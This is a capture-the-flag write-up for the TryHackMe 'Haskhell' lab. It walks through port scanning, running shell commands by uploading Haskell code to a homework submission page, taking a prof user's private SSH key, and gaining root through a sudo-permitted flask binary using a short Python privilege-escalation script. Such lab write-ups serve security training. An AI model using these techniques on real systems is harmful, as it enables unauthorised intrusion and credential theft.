------------------

### CTF: TRYHACKME
### LAB: HASKHELL

------------------

![image](https://github.com/user-attachments/assets/39815188-4107-45f4-bf42-317c6944b985)

------------------

### RECONNAISANCE

- Rustscan's output

      ❯ rustscan -a 10.10.245.164 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.245.164:22
      Open 10.10.245.164:5001
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 09:03 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 09:03
      Completed NSE at 09:03, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 09:03
      Completed NSE at 09:03, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 09:03
      Completed NSE at 09:03, 0.00s elapsed
      Initiating Ping Scan at 09:03
      Scanning 10.10.245.164 [2 ports]
      Completed Ping Scan at 09:03, 0.16s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 09:03
      Completed Parallel DNS resolution of 1 host. at 09:03, 0.05s elapsed
      DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 09:03
      Scanning 10.10.245.164 [2 ports]
      Discovered open port 22/tcp on 10.10.245.164
      Discovered open port 5001/tcp on 10.10.245.164
      Completed Connect Scan at 09:03, 0.16s elapsed (2 total ports)
      Initiating Service scan at 09:03
      Scanning 2 services on 10.10.245.164
      Completed Service scan at 09:03, 19.79s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.245.164.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 09:03
      Completed NSE at 09:04, 26.73s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 09:04
      Completed NSE at 09:04, 1.14s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 09:04
      Completed NSE at 09:04, 0.00s elapsed
      Nmap scan report for 10.10.245.164
      Host is up, received conn-refused (0.16s latency).
      Scanned at 2024-08-27 09:03:21 EDT for 49s
      
      PORT     STATE SERVICE REASON  VERSION
      22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6azVu3Hr+20SblWk0j7SeT8U3VySD4u18ChyDYyOoZiza2PTe1qsuwnw06/kboHaLejqPmnxkMDWgEeXoW0L11q2D8mfSf8EVvk++7bNqQ0mlkjdcknOs11mdYqSOkM1yw06LolltKtjlf/FpT706QFkRKQO30fT4YgKY6GD71aYdafhTBgZlXA51pGyruDUOP+lqhVPvLZJnI/oOTWkv5kT0a3T+FGRZfEi+GBrhvxP7R7n3QFRSBDPKSBRYLVdlSYXPD83P1pND6F/r3BvyfHw4UY0yKbw+ntvhiRcUI2FYyN5Vj1Jrb6ipCnp5+UcFdmROOHSgWS5Qzzx5fPZB
      |   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMx1lBsNtSWJvxM159Ahr110Jpf3M/dVqblDAoVXd8QSIEYIxEgeqTdbS4HaHPYnFyO1j8s6fQuUemJClGw3Bh8=
      |   256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICPmznEBphODSYkIjIjOA+0dmQPxltUfnnCTjaYbc39R
      5001/tcp open  http    syn-ack Gunicorn 19.7.1
      |_http-title: Homepage
      |_http-server-header: gunicorn/19.7.1
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- FFUF's output

![image](https://github.com/user-attachments/assets/5d93beae-8096-4303-8ec9-985fd083d801)

- The `homework1` page states students are to submit some exercises involving haskell programming.The site states that it accepts
only haskell code and compiles,run and renders the output.Most programming languages have modules that allow execution of shell commands and if not properly filtered, it can lead to shell commands execution.

![image](https://github.com/user-attachments/assets/763ba897-f088-44f3-9ddd-014bce05cb97)

- The `submit` route allows us to upload files.I used this haskell code to execute shell commands.

      import System.Process
      
      main = callCommand "<shell commands>"

![image](https://github.com/user-attachments/assets/80778add-3402-4624-a21b-19a84e016c10)

- Reverse shell

![image](https://github.com/user-attachments/assets/5f54a853-bc1c-4ceb-82ae-3a1f93e3a371)


### Pivoting to user `prof`

- I checked user `prof` directory and found his private ssh key.

![image](https://github.com/user-attachments/assets/72e5e411-0223-4b3c-952a-9c52a581bc42)

- I copied it to my machine with nc.

![image](https://github.com/user-attachments/assets/61700436-d7e1-4764-8753-ddb0cb757e24)

![image](https://github.com/user-attachments/assets/79b64576-5483-4814-a427-f060161f957b)

- SSH access

![image](https://github.com/user-attachments/assets/718da839-4ff0-49c0-b15f-88ca7371fc6e)

--------------------------

### PRIVESC with flask

- I ran `sudo -l` and discovered that I can run `flask` binary as root.

![image](https://github.com/user-attachments/assets/f2eb3cff-6a9f-4bca-9939-f56344b68fc0)

- Poc for flask,save with `app.py`

            #! /usr/bin/env python3
            import os
            from flask import Flask,render_template_string
            
            app = Flask(__name__)
            os.setuid(0)
            os.setgid(0)
            os.system("bash -p")
            
            @app.route("/")
            def index():
                return render_template_string("Life tuff ooo!!!!")
            
            if __name__ == "__main__":
               app.run(port=8080,debug=True)

- Set the environmetal variables

      export FLASK_APP=app.py
      export FLASK_ENV=development

- Root

![image](https://github.com/user-attachments/assets/02781bf4-3d16-4e4e-9bd9-be8e23c07191)


----------------------

### REFERENCES

- [Shell Command execution with Haskell](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)
  
-----------------------

### THANKS FOR READING

-----------------------





  


